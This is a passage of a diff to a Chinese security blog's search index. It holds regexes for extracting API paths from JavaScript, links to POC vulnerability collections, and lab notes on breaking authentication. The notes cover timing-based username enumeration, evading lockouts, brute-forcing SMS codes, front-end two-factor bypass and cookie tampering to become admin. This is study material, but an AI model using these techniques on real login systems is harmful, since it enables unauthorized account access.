第一个字符不能为特殊符号</span><br><span class="line">[^&quot;&#x27;&gt;&lt;,;|()]&#123;1,&#125;)                    # 后续字符为路径</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line"></span><br><span class="line"># 中文解释：提取形如 &quot;/api/user&quot;、&quot;../img/pic.png&quot; 的相对路径链接</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 3. 匹配目录+资源文件（如 action、js、png）</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line">([a-zA-Z0-9_\-/]&#123;1,&#125;/                # 至少一个目录名 + 斜杠</span><br><span class="line">[a-zA-Z0-9_\-/]&#123;1,&#125;                  # 文件名</span><br><span class="line">\.(?:[a-zA-Z]&#123;1,4&#125;|action)           # 文件后缀（如 .js/.css/.action）</span><br><span class="line">(?:[\?|/][^&quot;&#x27; ]&#123;0,&#125;|))               # 可选参数或路径，如 ?id=1</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line"></span><br><span class="line"># 中文解释：提取形如 &quot;admin/login.action&quot;、&quot;static/app.js?v=1&quot; 的接口或资源路径</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 4. 匹配单文件名 + 参数（如 login.php?id=1）</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line">([a-zA-Z0-9_\-]&#123;1,&#125;                  # 文件名</span><br><span class="line">\.(?:php|asp|aspx|jsp|json|          # 特定后缀（可扩展）</span><br><span class="line">action|html|js|txt|xml)</span><br><span class="line">(?:\?[^&quot;&#x27;]&#123;0,&#125;|))                    # 可选参数</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line"></span><br><span class="line"># 中文解释：提取形如 &quot;index.php?id=1&quot;、&quot;test.jsp&quot; 的单独接口文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 5. 匹配 .do/.cgi/.py 等其他接口风格</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line">([a-zA-Z0-9_\-/.]&#123;1,&#125;</span><br><span class="line">\.(?:do|cgi|py|rb|go)</span><br><span class="line">(?:\?[^&quot;&#x27;]&#123;0,&#125;|))</span><br><span class="line">(?:&quot;|&#x27;)</span><br><span class="line"></span><br><span class="line"># 中文解释：提取 &quot;.do&quot;、&quot;.cgi&quot;、&quot;.py&quot; 等扩展名接口（例如 WebLogic、老系统常见）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h1><p><a href="https://github.com/cliayn/bp_py_regular-expressions">bp插件</a></p>
+<p><a href="https://github.com/cliayn/re_js_api-dir">api脚本</a></p>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>jython</tag>
+        <tag>Burp Suite</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>渗透测试的简单排查</title>
     <url>/2025/09/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B0%B4%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98/</url>
     <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>​	渗透测试中包含太多重复且单一的漏洞排查，记录排查过程中的心得，以便之后可以快速进行排查缺陷，所采用的方法是正则匹配</p>
@@ -3084,6 +3246,19 @@
       </tags>
   </entry>
   <entry>
+    <title>漏洞库</title>
+    <url>/2024/12/26/%E6%BC%8F%E6%B4%9E%E5%BA%93/</url>
+    <content><![CDATA[<p><a href="https://wiki.wy876.cn/#/">漏洞文库</a></p>
+<p><a href="https://github.com/wy876/POC">github漏洞库</a></p>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>poc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>湖湘杯记录</title>
     <url>/2025/08/04/%E6%B9%96%E6%B9%98%E6%9D%AF%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<h2 id="–-湖湘杯的分值只有权限分和信息分"><a href="#–-湖湘杯的分值只有权限分和信息分" class="headerlink" title="– 湖湘杯的分值只有权限分和信息分"></a>– 湖湘杯的分值只有权限分和信息分</h2><p>（新手记录）</p>
@@ -3126,19 +3301,6 @@
       </categories>
       <tags>
         <tag>Red team</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>漏洞库</title>
-    <url>/2024/12/26/%E6%BC%8F%E6%B4%9E%E5%BA%93/</url>
-    <content><![CDATA[<p><a href="https://wiki.wy876.cn/#/">漏洞文库</a></p>
-<p><a href="https://github.com/wy876/POC">github漏洞库</a></p>
-]]></content>
-      <categories>
-        <category>Cybersecurity</category>
-      </categories>
-      <tags>
-        <tag>poc</tag>
       </tags>
   </entry>
   <entry>
@@ -3193,28 +3355,6 @@
       </tags>
   </entry>
   <entry>
-    <title>自动追番网址</title>
-    <url>/2024/12/25/%E8%87%AA%E5%8A%A8%E8%BF%BD%E7%95%AA%E7%BD%91%E5%9D%80/</url>
-    <content><![CDATA[<h1 id="网址"><a href="#网址" class="headerlink" title="网址"></a>网址</h1><p><a href="https://www.autobangumi.org/">AutoBangumi官网</a> —利用rss订阅字幕组，实现自动追番，部署比较轻松，docker部署</p>
-<p><a href="https://www.qbittorrent.org/download">qbittorrent下载地址</a> —下载器，订阅后这玩意负责自动下载，我1kG的流量就这么没的</p>
-<p><a href="https://emby.media/download.html">Emby下载地址</a> —播放器，其他的也可以，具体看bangumi和服务器支不支持</p>
-<span id="more"></span>
-
-<h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p><img src="/../image/auto_anime/1.png"></p>
-<hr>
-<p><a href="https://github.com/wushuo894/ani-rss?tab=readme-ov-file">ani-rss项目地址-GitHub</a> —支持 <strong>Transmission</strong> <strong>qBittorrent</strong> <strong>Aria2</strong> 下载器</p>
-<p>ani-rss部署参考别个博客<a href="https://www.himiku.com/archives/ani-rss.html">初之音博客</a></p>
-]]></content>
-      <categories>
-        <category>anime</category>
-      </categories>
-      <tags>
-        <tag>rss</tag>
-        <tag>qBitTorrent</tag>
-        <tag>Two-dimensional</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>web和小程序的漏洞排查</title>
     <url>/2024/12/20/%E7%AC%94%E8%AE%B0_js-request/</url>
     <content><![CDATA[<p>该篇文章为记录在工作时遇到的基本问题以及对应的解决方式，以免自己把一些方法用完就忘，下次遇到又得🐔🐔</p>
@@ -3264,6 +3404,28 @@
         <tag>Cybersecurity</tag>
         <tag>jwt</tag>
         <tag>keys</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>自动追番网址</title>
+    <url>/2024/12/25/%E8%87%AA%E5%8A%A8%E8%BF%BD%E7%95%AA%E7%BD%91%E5%9D%80/</url>
+    <content><![CDATA[<h1 id="网址"><a href="#网址" class="headerlink" title="网址"></a>网址</h1><p><a href="https://www.autobangumi.org/">AutoBangumi官网</a> —利用rss订阅字幕组，实现自动追番，部署比较轻松，docker部署</p>
+<p><a href="https://www.qbittorrent.org/download">qbittorrent下载地址</a> —下载器，订阅后这玩意负责自动下载，我1kG的流量就这么没的</p>
+<p><a href="https://emby.media/download.html">Emby下载地址</a> —播放器，其他的也可以，具体看bangumi和服务器支不支持</p>
+<span id="more"></span>
+
+<h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p><img src="/../image/auto_anime/1.png"></p>
+<hr>
+<p><a href="https://github.com/wushuo894/ani-rss?tab=readme-ov-file">ani-rss项目地址-GitHub</a> —支持 <strong>Transmission</strong> <strong>qBittorrent</strong> <strong>Aria2</strong> 下载器</p>
+<p>ani-rss部署参考别个博客<a href="https://www.himiku.com/archives/ani-rss.html">初之音博客</a></p>
+]]></content>
+      <categories>
+        <category>anime</category>
+      </categories>
+      <tags>
+        <tag>rss</tag>
+        <tag>qBitTorrent</tag>
+        <tag>Two-dimensional</tag>
       </tags>
   </entry>
   <entry>
@@ -3391,55 +3553,6 @@
         <tag>Information Gathering</tag>
         <tag>Intrusion Detection</tag>
         <tag>Attack Analysis</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>靶场练习-身份认证</title>
-    <url>/2025/06/17/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h1><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><h3 id="响应时间异常"><a href="#响应时间异常" class="headerlink" title="响应时间异常"></a>响应时间异常</h3><h5 id="利用因子：存在响应时间判断用户名的可能"><a href="#利用因子：存在响应时间判断用户名的可能" class="headerlink" title="利用因子：存在响应时间判断用户名的可能"></a>利用因子：存在响应时间判断用户名的可能</h5><p>密码账号认证存在响应时间差距，当密码长度100+时，用户名正确，校验密码时间将过长，适用于按顺序解析的账号密码</p>
-<p>注：新版bp没有respose time了，可以用如下列，也可以用logger++插件</p>
-<table>
-<thead>
-<tr>
-<th align="center">字段</th>
-<th align="center">含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center"><strong>Response received</strong></td>
-<td align="center">收到响应头的时间（即服务端开始响应）</td>
-</tr>
-<tr>
-<td align="center"><strong>Response completed</strong></td>
-<td align="center">整个响应体（HTML&#x2F;JSON等）加载完的时间</td>
-</tr>
-</tbody></table>
-<span id="more"></span>
-
-<h3 id="限制失败次数"><a href="#限制失败次数" class="headerlink" title="限制失败次数"></a>限制失败次数</h3><h5 id="利用因子：登录会刷新积累的失败次数"><a href="#利用因子：登录会刷新积累的失败次数" class="headerlink" title="利用因子：登录会刷新积累的失败次数"></a>利用因子：登录会刷新积累的失败次数</h5><p>正确账号密码绕过爆破限制，就是时不时登录已知的正确账号刷新失败次数</p>
-<p>注：X-Forwarded-For: 116.23.165.1 一般不用这个了，比较远古</p>
-<h3 id="限制账号登录"><a href="#限制账号登录" class="headerlink" title="限制账号登录"></a>限制账号登录</h3><h5 id="利用因子：用户体量极大"><a href="#利用因子：用户体量极大" class="headerlink" title="利用因子：用户体量极大"></a>利用因子：用户体量极大</h5><p>爆破随机账号，适用于用户体量大的</p>
-<p>即任意账号，限制密码个数</p>
-<h3 id="常规账号登录"><a href="#常规账号登录" class="headerlink" title="常规账号登录"></a>常规账号登录</h3><h5 id="利用因子：存在多个认证因素时，不报错"><a href="#利用因子：存在多个认证因素时，不报错" class="headerlink" title="利用因子：存在多个认证因素时，不报错"></a>利用因子：存在多个认证因素时，不报错</h5><p>例如：</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;carlos&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;pass&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;abc&quot;</span><span class="punctuation">,</span><span class="string">&quot;123456&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="—多因素认证—"><a href="#—多因素认证—" class="headerlink" title="—多因素认证—"></a>—多因素认证—</h3><hr>
-<h5 id="–-第二因素脆弱"><a href="#–-第二因素脆弱" class="headerlink" title="–!第二因素脆弱"></a>–!第二因素脆弱</h5><p>例如：图形验证码可用captcha-killer插件绕过，短信验证码4位数字可爆破</p>
-<p>如果是人脸或者指纹、加密狗这类的，建议直接<strong>前端绕过</strong>跑api，或者寻找<strong>注册接口</strong>，也可以尝试<strong>伪造用户标识</strong></p>
-<h5 id="–-第二因素不授权"><a href="#–-第二因素不授权" class="headerlink" title="–!第二因素不授权"></a>–!第二因素不授权</h5><p>即有缺陷的双因素验证逻辑</p>
-<p>有些应用你登录了就会给token，其他第二因素认证就是一个前端，直接绕过就行</p>
-<h5 id="–-token本身存在越权"><a href="#–-token本身存在越权" class="headerlink" title="–!token本身存在越权"></a>–!token本身存在越权</h5><p>例如cookie本身可解密，且包含用户信息，例如解密后，user&#x3D;test，直接改成user&#x3D;admin</p>
-<hr>
-<p><u>小技巧</u></p>
-<p>bp中存在session，可用用宏跑规定的请求包，替换session以保证服务正常运行，turbo intuder可用自定义python爆破</p>
-]]></content>
-      <categories>
-        <category>Cybersecurity</category>
-      </categories>
-      <tags>
-        <tag>article</tag>
       </tags>
   </entry>
   <entry>
@@ -5200,6 +5313,55 @@
       </categories>
       <tags>
         <tag>Error correcting</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>靶场练习-身份认证</title>
+    <url>/2025/06/17/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h1><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><h3 id="响应时间异常"><a href="#响应时间异常" class="headerlink" title="响应时间异常"></a>响应时间异常</h3><h5 id="利用因子：存在响应时间判断用户名的可能"><a href="#利用因子：存在响应时间判断用户名的可能" class="headerlink" title="利用因子：存在响应时间判断用户名的可能"></a>利用因子：存在响应时间判断用户名的可能</h5><p>密码账号认证存在响应时间差距，当密码长度100+时，用户名正确，校验密码时间将过长，适用于按顺序解析的账号密码</p>
+<p>注：新版bp没有respose time了，可以用如下列，也可以用logger++插件</p>
+<table>
+<thead>
+<tr>
+<th align="center">字段</th>
+<th align="center">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>Response received</strong></td>
+<td align="center">收到响应头的时间（即服务端开始响应）</td>
+</tr>
+<tr>
+<td align="center"><strong>Response completed</strong></td>
+<td align="center">整个响应体（HTML&#x2F;JSON等）加载完的时间</td>
+</tr>
+</tbody></table>
+<span id="more"></span>
+
+<h3 id="限制失败次数"><a href="#限制失败次数" class="headerlink" title="限制失败次数"></a>限制失败次数</h3><h5 id="利用因子：登录会刷新积累的失败次数"><a href="#利用因子：登录会刷新积累的失败次数" class="headerlink" title="利用因子：登录会刷新积累的失败次数"></a>利用因子：登录会刷新积累的失败次数</h5><p>正确账号密码绕过爆破限制，就是时不时登录已知的正确账号刷新失败次数</p>
+<p>注：X-Forwarded-For: 116.23.165.1 一般不用这个了，比较远古</p>
+<h3 id="限制账号登录"><a href="#限制账号登录" class="headerlink" title="限制账号登录"></a>限制账号登录</h3><h5 id="利用因子：用户体量极大"><a href="#利用因子：用户体量极大" class="headerlink" title="利用因子：用户体量极大"></a>利用因子：用户体量极大</h5><p>爆破随机账号，适用于用户体量大的</p>
+<p>即任意账号，限制密码个数</p>
+<h3 id="常规账号登录"><a href="#常规账号登录" class="headerlink" title="常规账号登录"></a>常规账号登录</h3><h5 id="利用因子：存在多个认证因素时，不报错"><a href="#利用因子：存在多个认证因素时，不报错" class="headerlink" title="利用因子：存在多个认证因素时，不报错"></a>利用因子：存在多个认证因素时，不报错</h5><p>例如：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;carlos&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;pass&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;abc&quot;</span><span class="punctuation">,</span><span class="string">&quot;123456&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="—多因素认证—"><a href="#—多因素认证—" class="headerlink" title="—多因素认证—"></a>—多因素认证—</h3><hr>
+<h5 id="–-第二因素脆弱"><a href="#–-第二因素脆弱" class="headerlink" title="–!第二因素脆弱"></a>–!第二因素脆弱</h5><p>例如：图形验证码可用captcha-killer插件绕过，短信验证码4位数字可爆破</p>
+<p>如果是人脸或者指纹、加密狗这类的，建议直接<strong>前端绕过</strong>跑api，或者寻找<strong>注册接口</strong>，也可以尝试<strong>伪造用户标识</strong></p>
+<h5 id="–-第二因素不授权"><a href="#–-第二因素不授权" class="headerlink" title="–!第二因素不授权"></a>–!第二因素不授权</h5><p>即有缺陷的双因素验证逻辑</p>
+<p>有些应用你登录了就会给token，其他第二因素认证就是一个前端，直接绕过就行</p>
+<h5 id="–-token本身存在越权"><a href="#–-token本身存在越权" class="headerlink" title="–!token本身存在越权"></a>–!token本身存在越权</h5><p>例如cookie本身可解密，且包含用户信息，例如解密后，user&#x3D;test，直接改成user&#x3D;admin</p>
+<hr>
+<p><u>小技巧</u></p>
+<p>bp中存在session，可用用宏跑规定的请求包，替换session以保证服务正常运行，turbo intuder可用自定义python爆破</p>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>article</tag>
       </tags>
   </entry>
   <entry>
